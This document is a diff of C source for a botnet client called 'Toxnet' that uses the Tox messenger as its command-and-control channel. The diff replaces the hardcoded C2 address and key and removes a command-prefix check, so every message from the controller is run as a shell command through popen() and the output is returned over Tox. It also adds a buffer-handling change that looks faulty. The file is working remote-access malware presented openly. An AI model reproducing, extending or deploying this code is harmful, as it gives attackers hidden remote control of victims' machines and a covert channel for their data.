@@ -26,8 +26,8 @@ typedef struct DHT_node {
     const char key_hex[TOX_PUBLIC_KEY_SIZE*2 + 1];
 } DHT_node;
 
-char *c2id = "4681B723156C253BC695EE5BD25076333AA252F6E8312E7628E40FDC0BA43912EDB35C6E4718"; // C2 Address
-char *c2pub = "4681B723156C253BC695EE5BD25076333AA252F6E8312E7628E40FDC0BA43912"; // C2 Public key
+char *c2id = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B8820182949B28C7FD69F"; // C2 Address
+char *c2pub = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B88201829"; // C2 Public key
 
 uint8_t * hex2bin(const char *hex) {
     size_t len = strlen(hex) / 2;
@@ -44,40 +44,33 @@ char * bin2hex(const uint8_t *bin, size_t length) {
     char *hex = malloc(2 * length + 1);
     char *saved = hex;
     for (int i = 0; i < length; i++, hex += 2) {
-        sprintf (hex, "%02X", bin[i]);
+        sprintf(hex, "%02X", bin[i]);
     }
     return saved;
 }
 
 void friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type, const uint8_t *message, size_t length, void *user_data) {
-    uint8_t client_id[TOX_PUBLIC_KEY_SIZE]; // Setup variable
-    tox_friend_get_public_key(tox, friend_num, client_id, NULL); // Assign public key to client_id
-    char *c2check = bin2hex(client_id, sizeof(client_id)); // Convert decimals to hex
-    // Check if incoming message is address of the C2
+
+    uint8_t client_id[TOX_PUBLIC_KEY_SIZE];
+    tox_friend_get_public_key(tox, friend_num, client_id, NULL);
+    char *c2check = bin2hex(client_id, sizeof(client_id));
+
     if (strcmp(c2check, c2pub) == 0) {
-        // Setup vars
-        // cmdt = First word in message
-        char *cmd, *cmdt;
-        // Duplicate message into cmdt
-        cmdt = strdup(message);
-        // Split cmdt where space occurs
-        cmdt = strtok(cmdt, " ");
-        // Tokenize
+
+        char *cmd, *admin;
+        admin = strdup(message);
+        admin = strtok(admin, " ");
         cmd = strtok(NULL, "");
 
-        if (strcmp(cmdt, "!") == 0) {
+        FILE *fp;
+        uint8_t path[TOX_MAX_MESSAGE_LENGTH];
+        fp = popen(cmd, "r");
 
-            FILE *fp;
-            uint8_t path[TOX_MAX_MESSAGE_LENGTH];
-            fp = popen(cmd, "r");
-
-            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
-                tox_friend_send_message(tox, friend_num,
-                                        TOX_MESSAGE_TYPE_NORMAL, path,
-                                        strlen(path), NULL);
-            }
-            pclose(fp);
+        while (fgets(path, sizeof(path) - sizeof(admin) - 1, fp) != NULL) {
+            strcat(path, admin);
+            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, path, strlen(path), NULL);
         }
+        pclose(fp);
     }
 }
 
@@ -99,9 +92,7 @@ int main() {
     Tox *tox = tox_new(NULL, NULL);
 
     const char *name = "Toxnet";
-
     tox_self_set_name(tox, name, strlen(name), NULL);
-    // Set status
     tox_self_set_status_message(tox, status, strlen(status), NULL);
 
     DHT_node nodes[] =
@@ -118,8 +109,7 @@ int main() {
 
     for (size_t i = 0; i < sizeof(nodes)/sizeof(DHT_node); i ++) {
         unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
-        sodium_hex2bin(key_bin, sizeof(key_bin), nodes[i].key_hex, sizeof(nodes[i].key_hex)-1,
-                       NULL, NULL, NULL);
+        sodium_hex2bin(key_bin, sizeof(key_bin), nodes[i].key_hex, sizeof(nodes[i].key_hex)-1, NULL, NULL, NULL);
         tox_bootstrap(tox, nodes[i].ip, nodes[i].port, key_bin, NULL);
     }
 
@@ -134,17 +124,12 @@ int main() {
     }
 
     tox_callback_friend_message(tox, friend_message_cb);
-
     tox_callback_self_connection_status(tox, self_connection_status_cb);
-
     tox_friend_add(tox, hex2bin(c2id), "Incoming", sizeof(9), NULL); // Add C2
 
     while (1) {
-
         tox_iterate(tox, NULL);
-
         usleep(tox_iteration_interval(tox) * 1000);
-
     }
 
     tox_kill(tox);
